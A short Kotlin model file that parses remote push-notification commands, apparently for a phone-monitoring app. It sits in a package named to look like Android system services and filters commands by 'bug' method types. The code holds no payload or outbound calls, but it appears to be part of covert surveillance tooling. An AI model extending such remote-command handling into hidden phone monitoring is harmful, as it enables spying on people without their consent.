package com.android.services.models

import com.android.services.util.AppConstants
import com.android.services.util.BugMethod
import com.android.services.util.logVerbose
import com.google.gson.annotations.SerializedName

data class PushNotificationsMessages(
    @SerializedName("message")
    val pushNotifications: List<PushNotification>
)

data class PushNotification(
    val id: String,
    @SerializedName("phone_service_id")
    val phoneServiceId: String,
    val method: String,
    @SerializedName("notification_data")
    val notificationData: String,
    val status: Int,
    @SerializedName("unique_id")
    val uniqueId: String,
    @SerializedName("date_created")
    val dateCreated: String,
    @SerializedName("date_modified")
    val dateModified: String
) {
    constructor() : this("", "", "", "", 0, "", "", "")
}

fun List<PushNotification>.sortBugs(bugMethod: BugMethod): List<PushNotification> {
    return this.filter {
        it.method.lowercase() == bugMethod.javaClass.simpleName.lowercase()
    }.sortedByDescending {
        it.dateCreated
    }
}
